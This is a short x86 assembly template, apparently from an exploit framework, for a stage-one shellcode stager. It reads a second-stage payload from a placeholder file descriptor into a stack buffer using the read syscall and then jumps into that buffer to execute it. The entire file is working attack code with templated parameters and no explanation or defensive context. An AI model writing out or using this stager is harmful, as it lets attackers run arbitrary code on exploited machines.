.section .text
.global _start

_start:

xor %eax, %eax
xor %ebx, %ebx
xor %ecx, %ecx
xor %edx, %edx
movb ${{FD_NUM}}, %bl		# fd
dec %ebx
movb ${{PAYLOAD_SIZE}}, %dh	# sizeof(payload_buf)
sub %edx, %esp 
mov %esp, %ecx				# payload_buf = esp - sizeof(payload_buf)
mov %esp, %ebp				# func = payload_buf
movb $0x03, %al	;
int $0x80
# read(fd, payload_buf, 1024)

jmp *%ebp	;
# jump *func

